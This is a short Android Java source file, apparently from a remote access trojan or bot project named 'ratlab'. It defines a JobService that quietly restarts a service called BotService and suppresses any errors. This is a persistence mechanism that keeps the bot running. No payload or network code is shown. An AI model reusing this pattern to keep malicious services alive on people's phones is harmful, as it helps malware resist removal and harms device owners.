package com.ratlab;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;

public class RestartJobService extends JobService {

    @Override
    public boolean onStartJob(JobParameters params) {
        try {
            Intent svc = new Intent(this, BotService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception e) {}
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
